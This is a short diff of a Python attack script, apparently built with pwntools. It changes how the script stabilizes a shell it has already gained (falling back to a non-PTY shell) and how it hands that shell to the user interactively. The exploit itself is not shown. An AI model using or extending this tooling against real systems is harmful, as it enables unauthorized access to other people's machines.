@@ -50,17 +50,22 @@ def main(args: Namespace):
         p.success('Got a shell!')
     
     with log.progress('Trying to stabilize the shell...') as p:
-        shell_service.stabilize_shell(shell)
-        # Start shell checker to control the closing
-        shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
-        shell_handler_thread.setDaemon(True)
-        shell_handler_thread.start()
-        p.success('Shell stabilized!')
-    
+        try:
+            shell_service.stabilize_shell(shell)
+            p.success('Shell stabilized!')
+        except:
+            p.failure('Shell stabilization not possible, a non pty shell will be provided')
+        finally:
+            # Start shell checker to control the closing
+            shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
+            shell_handler_thread.setDaemon(True)
+            shell_handler_thread.start()
+        
     print('\r', end='')
     log.info('Switching to interactive mode')
     log.setLevel('error')
 
+    shell.sendline(b'') # Make the prompt appears
     shell.interactive()
 
 if __name__ == '__main__':
@@ -73,6 +78,5 @@ if __name__ == '__main__':
         main(args)
     except KeyboardInterrupt:
         log.failure('Interrupted')
-    except Exception as e:
-        print(e)
+    except Exception:
         log.failure('Attack failed!')
